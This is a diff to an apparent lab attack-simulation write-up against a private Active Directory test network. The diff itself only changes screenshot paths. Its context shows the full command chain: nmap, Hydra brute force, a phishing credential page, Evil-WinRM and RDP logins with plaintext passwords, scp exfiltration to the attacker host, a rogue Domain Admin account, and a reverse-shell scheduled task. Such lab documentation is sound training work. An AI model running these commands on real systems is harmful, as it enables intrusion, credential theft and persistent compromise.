@@ -39,25 +39,25 @@ nmap -sn 10.0.0.0/24
 nmap -sV -sC 10.0.0.5    # Domain Controller
 ```
 
-![DC (10.0.0.5): DNS/53, HTTP/80 (IIS 10.0), Kerberos/88, LDAP/389, SMB/445, RDP/3389 — classic Active Directory fingerprint](screenshots/attack-simulation/se_5.png)
+![DC (10.0.0.5): DNS/53, HTTP/80 (IIS 10.0), Kerberos/88, LDAP/389, SMB/445, RDP/3389 — classic Active Directory fingerprint](../screenshots/attack-simulation/se_5.png)
 
 ```bash
 nmap -sV -sC 10.0.0.8    # Corporate Server
 ```
 
-![Corp Server (10.0.0.8): SSH/22 running OpenSSH 8.9p1 Ubuntu — primary attack entry point identified](screenshots/attack-simulation/se_8.png)
+![Corp Server (10.0.0.8): SSH/22 running OpenSSH 8.9p1 Ubuntu — primary attack entry point identified](../screenshots/attack-simulation/se_8.png)
 
 ```bash
 nmap -sV -sC 10.0.0.100  # Windows Workstation
 ```
 
-![Windows Workstation (10.0.0.100): msrpc/135, WinRM/5985 — lateral movement vector identified](screenshots/attack-simulation/se_100.png)
+![Windows Workstation (10.0.0.100): msrpc/135, WinRM/5985 — lateral movement vector identified](../screenshots/attack-simulation/se_100.png)
 
 ```bash
 nmap -sV -sC 10.0.0.101  # Linux Client (Jane)
 ```
 
-![Linux Client (10.0.0.101): SSH/22 running OpenSSH 8.9p1 Ubuntu — Jane's machine discovered](screenshots/attack-simulation/se_101.png)
+![Linux Client (10.0.0.101): SSH/22 running OpenSSH 8.9p1 Ubuntu — Jane's machine discovered](../screenshots/attack-simulation/se_101.png)
 
 **Key findings:**
 - `10.0.0.5` — Domain Controller (DNS, Kerberos, LDAP, SMB, RDP)
@@ -82,7 +82,7 @@ With SSH running on both `10.0.0.8` and `10.0.0.101`, the attacker uses Hydra wi
 hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.8
 ```
 
-![Hydra successfully cracks root@10.0.0.8 — password: november — found in rockyou.txt wordlist](screenshots/attack-simulation/hydra_ssh_8.png)
+![Hydra successfully cracks root@10.0.0.8 — password: november — found in rockyou.txt wordlist](../screenshots/attack-simulation/hydra_ssh_8.png)
 
 ### Brute Force Linux Client (10.0.0.101)
 
@@ -115,7 +115,7 @@ sudo touch /var/www/html/creds.log && sudo chmod 666 /var/www/html/creds.log
 sudo service apache2 start
 ```
 
-![Attacker's fake "Verify Your Password" credential-harvesting page hosted at http://10.0.0.9 — identical look to a legitimate corporate portal](screenshots/attack-simulation/fake_verify_page_example.png)
+![Attacker's fake "Verify Your Password" credential-harvesting page hosted at http://10.0.0.9 — identical look to a legitimate corporate portal](../screenshots/attack-simulation/fake_verify_page_example.png)
 
 ### Send the Phishing Email
 
@@ -128,15 +128,15 @@ sudo python3 send_email.py
 
 The email warns of a suspicious login attempt and urges the victim to verify their credentials within 24 hours — a classic urgency manipulation technique.
 
-![Phishing email captured in Jane's MailHog terminal parser — from: project-sp-hrteam@corp.project-sp-dc.com — HTML body contains malicious "Verify My Account" link pointing to 10.0.0.9](screenshots/attack-simulation/phishing_email_jane_parser.png)
+![Phishing email captured in Jane's MailHog terminal parser — from: project-sp-hrteam@corp.project-sp-dc.com — HTML body contains malicious "Verify My Account" link pointing to 10.0.0.9](../screenshots/attack-simulation/phishing_email_jane_parser.png)
 
-![Jane's MailHog inbox (localhost:8025) shows the phishing email rendered — "Update Password!" with clickable "Verify My Account" hyperlink](screenshots/attack-simulation/phishing_email_web.png)
+![Jane's MailHog inbox (localhost:8025) shows the phishing email rendered — "Update Password!" with clickable "Verify My Account" hyperlink](../screenshots/attack-simulation/phishing_email_web.png)
 
 ### Credential Capture
 
 Jane clicks the link and enters her real credentials into the fake page:
 
-![Jane enters her credentials into the phishing site — username: jane, password: @password123! — page is indistinguishable from a real portal](screenshots/attack-simulation/fake_verify_real_example.png)
+![Jane enters her credentials into the phishing site — username: jane, password: @password123! — page is indistinguishable from a real portal](../screenshots/attack-simulation/fake_verify_real_example.png)
 
 The attacker checks the credential log:
 
@@ -144,7 +144,7 @@ The attacker checks the credential log:
 cat /var/www/html/creds.log
 ```
 
-![creds.log confirms two captured credential sets — amaryshchenko:hello123 (12:37) and jane:@password123! (12:41)](screenshots/attack-simulation/success_creds_fake_verify.png)
+![creds.log confirms two captured credential sets — amaryshchenko:hello123 (12:37) and jane:@password123! (12:41)](../screenshots/attack-simulation/success_creds_fake_verify.png)
 
 **Captured credentials:**
 
@@ -159,7 +159,7 @@ Username: amaryshchenko   Password: hello123
 ssh jane@10.0.0.101
 ```
 
-![SSH login as jane@10.0.0.101 successful — Welcome to Ubuntu 22.04 LTS (linux-client) — legitimate foothold established on the internal network](screenshots/attack-simulation/ssh_jane_result.png)
+![SSH login as jane@10.0.0.101 successful — Welcome to Ubuntu 22.04 LTS (linux-client) — legitimate foothold established on the internal network](../screenshots/attack-simulation/ssh_jane_result.png)
 
 ---
 
@@ -176,7 +176,7 @@ From the Linux Client, additional reconnaissance reveals WinRM ports (5985, 5986
 nxc winrm 10.0.0.100 -u users.txt -p pass.txt
 ```
 
-![NetExec confirms Administrator:@Deeboodah1! valid on WIN11SP (10.0.0.100) — (Pwn3d!) tag indicates full administrative WinRM access](screenshots/attack-simulation/netexec_enumeration.png)
+![NetExec confirms Administrator:@Deeboodah1! valid on WIN11SP (10.0.0.100) — (Pwn3d!) tag indicates full administrative WinRM access](../screenshots/attack-simulation/netexec_enumeration.png)
 
 > **Tool — NetExec (nxc):** Multi-protocol network exploitation tool. Tests credentials against SMB, WinRM, SSH, RDP, LDAP and more. `(Pwn3d!)` means the account has local admin privileges.
 
@@ -186,7 +186,7 @@ nxc winrm 10.0.0.100 -u users.txt -p pass.txt
 evil-winrm -i 10.0.0.100 -u Administrator -p @Deeboodah1!
 ```
 
-![Evil-WinRM shell established on 10.0.0.100 — whoami confirms corp\administrator — full interactive PowerShell session active](screenshots/attack-simulation/evil-winrm_post-exploitation.png)
+![Evil-WinRM shell established on 10.0.0.100 — whoami confirms corp\administrator — full interactive PowerShell session active](../screenshots/attack-simulation/evil-winrm_post-exploitation.png)
 
 > **Tool — Evil-WinRM:** Open-source tool providing an interactive PowerShell shell over WinRM. Used for post-exploitation after valid credentials are obtained.
 
@@ -205,9 +205,9 @@ With Administrator credentials confirmed on the workstation, the attacker identi
 xfreerdp /u:Administrator /p:'@Deeboodah1!' /v:10.0.0.5
 ```
 
-![xfreerdp command launched from Kali — connecting to DC (10.0.0.5) with Administrator credentials](screenshots/attack-simulation/xfreerdp.png)
+![xfreerdp command launched from Kali — connecting to DC (10.0.0.5) with Administrator credentials](../screenshots/attack-simulation/xfreerdp.png)
 
-![Full GUI RDP session on Domain Controller (FreeRDP: 10.0.0.5) — Windows Server 2025 Server Manager visible — Keys to the Kingdom obtained](screenshots/attack-simulation/xfreerdp_result.png)
+![Full GUI RDP session on Domain Controller (FreeRDP: 10.0.0.5) — Windows Server 2025 Server Manager visible — Keys to the Kingdom obtained](../screenshots/attack-simulation/xfreerdp_result.png)
 
 **Domain compromise achieved.** With full Administrator access to the Domain Controller the attacker can: create/delete any AD account, modify Group Policy Objects, dump the NTDS.dit database, and access every domain-joined machine.
 
@@ -225,11 +225,11 @@ cd C:\Users\Administrator\Documents\ProductionFiless
 scp ".\secrets.txt" kali@10.0.0.9:/home/kali/secrets.txt
 ```
 
-![SCP transfer from DC PowerShell — secrets.txt sent to kali@10.0.0.9 — 100% transfer confirmed at 2.6KB/s](screenshots/attack-simulation/scp_exfiltration_secrets.png)
+![SCP transfer from DC PowerShell — secrets.txt sent to kali@10.0.0.9 — 100% transfer confirmed at 2.6KB/s](../screenshots/attack-simulation/scp_exfiltration_secrets.png)
 
-![Attacker verifies file received on Kali — cat secrets.txt returns the stolen contents](screenshots/attack-simulation/scp_exfiltration_result.png)
+![Attacker verifies file received on Kali — cat secrets.txt returns the stolen contents](../screenshots/attack-simulation/scp_exfiltration_result.png)
 
-![Contents of secrets.txt: $PROJECT-SP{123HELLO} — sensitive production credential/flag data successfully exfiltrated](screenshots/attack-simulation/stolen_data_example.png)
+![Contents of secrets.txt: $PROJECT-SP{123HELLO} — sensitive production credential/flag data successfully exfiltrated](../screenshots/attack-simulation/stolen_data_example.png)
 
 ---
 
@@ -250,13 +250,13 @@ net localgroup Administrators project-sp-user /add
 net group "Domain Admins" project-sp-user /add
 ```
 
-![Rogue account project-sp-user created via Administrator PowerShell on DC — added to local Administrators and Domain Admins groups successfully](screenshots/attack-simulation/eviluser_creation.png)
+![Rogue account project-sp-user created via Administrator PowerShell on DC — added to local Administrators and Domain Admins groups successfully](../screenshots/attack-simulation/eviluser_creation.png)
 
 ```powershell
 net user project-sp-user /domain
 ```
 
-![net user /domain confirms project-sp-user: Account active, Local Group = *Administrators, Global Group = *Domain Admins + *Domain Users](screenshots/attack-simulation/confirm_eviluser.png)
+![net user /domain confirms project-sp-user: Account active, Local Group = *Administrators, Global Group = *Domain Admins + *Domain Users](../screenshots/attack-simulation/confirm_eviluser.png)
 
 ### Deploy Reverse Shell via Python HTTP Server
 
@@ -267,15 +267,15 @@ cd /home/reverse-shell
 python3 -m http.server 8000
 ```
 
-![Python HTTP server running on Kali port 8000 — serving reverse.ps1 — simultaneously showing confirmed eviluser creation in the background](screenshots/attack-simulation/pythonserv.png)
+![Python HTTP server running on Kali port 8000 — serving reverse.ps1 — simultaneously showing confirmed eviluser creation in the background](../screenshots/attack-simulation/pythonserv.png)
 
 The Domain Controller downloads the file by browsing to `http://10.0.0.9:8000` via the RDP session browser:
 
-![Browser on DC accesses http://10.0.0.9:8000 — directory listing shows reverse.ps1 available for download](screenshots/attack-simulation/download_reverse_pythonserv.png)
+![Browser on DC accesses http://10.0.0.9:8000 — directory listing shows reverse.ps1 available for download](../screenshots/attack-simulation/download_reverse_pythonserv.png)
 
 The file is saved to the persistence location:
 
-![File Explorer on DC confirms reverse.ps1 placed in AppData\Local\Microsoft\Windows\ — hidden among legitimate Windows system files](screenshots/attack-simulation/reverse_file_location.png)
+![File Explorer on DC confirms reverse.ps1 placed in AppData\Local\Microsoft\Windows\ — hidden among legitimate Windows system files](../screenshots/attack-simulation/reverse_file_location.png)
 
 ### Create Scheduled Task
 
@@ -283,9 +283,9 @@ The file is saved to the persistence location:
 schtasks /create /tn "PersistenceTask" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Administrator\AppData\Local\Microsoft\Windows\reverse.ps1" /sc daily /st 12:00
 ```
 
-![schtasks command creates PersistenceTask — SUCCESS: The scheduled task has been successfully created — runs daily at 12:00 PM](screenshots/attack-simulation/scheduled_task_reverse_shell_1.png)
+![schtasks command creates PersistenceTask — SUCCESS: The scheduled task has been successfully created — runs daily at 12:00 PM](../screenshots/attack-simulation/scheduled_task_reverse_shell_1.png)
 
-![Task Scheduler GUI confirms PersistenceTask — Status: Ready — Trigger: At 12:00 PM every day — Author: CORP\Administrator](screenshots/attack-simulation/scheduled_task_reverse_shell_2.png)
+![Task Scheduler GUI confirms PersistenceTask — Status: Ready — Trigger: At 12:00 PM every day — Author: CORP\Administrator](../screenshots/attack-simulation/scheduled_task_reverse_shell_2.png)
 
 ### Test the Reverse Shell
 
@@ -302,9 +302,9 @@ Set-ExecutionPolicy Unrestricted -Scope Process
 .\reverse.ps1
 ```
 
-![PowerShell on DC executes reverse.ps1 — initial execution policy block shown, then bypassed — script runs with [R] Run once selection](screenshots/attack-simulation/scheduled_task_reverse_shell_3.png)
+![PowerShell on DC executes reverse.ps1 — initial execution policy block shown, then bypassed — script runs with [R] Run once selection](../screenshots/attack-simulation/scheduled_task_reverse_shell_3.png)
 
-![Netcat on Kali catches the reverse shell callback from 10.0.0.5 — "Connected to reverse shell!" — whoami confirms corp\administrator](screenshots/attack-simulation/persistence_result.png)
+![Netcat on Kali catches the reverse shell callback from 10.0.0.5 — "Connected to reverse shell!" — whoami confirms corp\administrator](../screenshots/attack-simulation/persistence_result.png)
 
 **Two backdoors are now active:**
 - `project-sp-user` — Domain Admin account, survives Administrator password resets
